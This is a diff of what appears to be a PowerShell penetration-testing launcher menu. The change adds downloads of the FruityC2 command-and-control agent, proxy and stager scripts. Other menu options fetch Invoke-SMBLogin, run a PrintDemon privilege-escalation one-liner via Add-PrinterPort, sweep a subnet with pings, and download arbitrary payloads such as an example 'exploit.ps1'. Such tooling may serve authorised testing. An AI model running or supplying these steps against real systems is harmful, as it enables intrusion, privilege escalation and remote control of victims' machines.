@@ -360,7 +360,7 @@ while($true){
         '58' {ScaricaSSL "PrateekKumarSingh/AzViz" "AzViz.zip" "PrateekKumarSingh/AzViz/archive/master.zip"}
         '59' {Scarica "mvelazc0/Invoke-SMBLogin" "Invoke-SMBLogin.ps1" "mvelazc0/Invoke-SMBLogin/master/Invoke-SMBLogin.ps1"}
         '60' {write-host "PrintDemon PrivEsc"; Add-PrinterPort -Name C:\Windows\System32\ualapi.dll}
-        '61' {Scarica "xtr4nge/FruityC2/agent" "ps_agent.ps1" "xtr4nge/FruityC2/master/agent/ps_agent.ps1"}
+        '61' {Scarica "xtr4nge/FruityC2/agent" "ps_agent.ps1" "xtr4nge/FruityC2/master/agent/ps_agent.ps1"; Scarica "xtr4nge/FruityC2/agent" "ps_proxy.ps1" "xtr4nge/FruityC2/master/agent/ps_proxy.ps1"; Scarica "xtr4nge/FruityC2/agent" "ps_stager.ps1" "xtr4nge/FruityC2/master/agent/ps_stager.ps1"}
         '90' {(dir *.zip).Name; $NOME=read-host "Digit a zip file to extract"; if($NOME -ne "" -and $NOME.EndsWith(".zip")){if(Test-Path $NOME){[System.IO.Compression.ZipFile]::ExtractToDirectory($NOME, $NOME.Replace(".zip", ""))}else{write-host $NOME" does not exist"}}else{write-host "ERROR: empty field or it is not a zip file"}}
         '91' {write-host "Digit first three IPv4 Values dotted"; $IP=read-host "(example, 192.168.168)"; if($IP -ne ""){for ($RANGE = 0; $RANGE -lt 256; $RANGE++){$IPT="$IP.$RANGE"; Write-Host -NoNewLine "`rTest $IPT`r"; try{if((Test-Connection "$IPT" -Quiet -Count 1)){write-host "$IPT found"}}catch{}}}}
         '99' {write-host "Download a file"; write-host "Digit URI/URL and filename with extension"; $FILENAME=read-host "(example http://192.168.1.100/exploit.ps1)"; if($FILENAME -ne ""){write-host "downloading $FILENAME"; try{invoke-webrequest -uri $FILENAME -outfile $FILENAME;}catch{write-host $_}}}
